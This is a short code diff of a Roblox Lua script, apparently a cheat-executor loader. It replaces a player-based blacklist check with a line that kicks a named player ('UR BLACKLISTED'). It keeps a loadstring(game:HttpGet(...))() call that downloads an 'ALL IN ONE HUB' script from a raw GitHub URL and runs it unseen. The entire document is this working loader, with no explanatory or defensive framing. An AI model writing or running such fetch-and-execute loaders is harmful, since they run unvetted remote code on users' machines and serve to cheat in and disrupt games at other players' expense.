@@ -1,9 +1,2 @@
-if game.Players.LocalPlayer.Character then
-getgenv().Blacklist = false;
-end
-if game.Players.dwasdwa14.Character then
-getgenv().Blacklist = true;
-end
-if getgenv().Blacklist == false then
+game.Players.Kev2345671:Kick("UR BLACKLISTED")
 loadstring(game:HttpGet("https://raw.githubusercontent.com/BOBINYOURFLOP/BOBINYOURFLOP/main/ALL%20IN%20ONE%20HUB%20(%20)"))()
-end
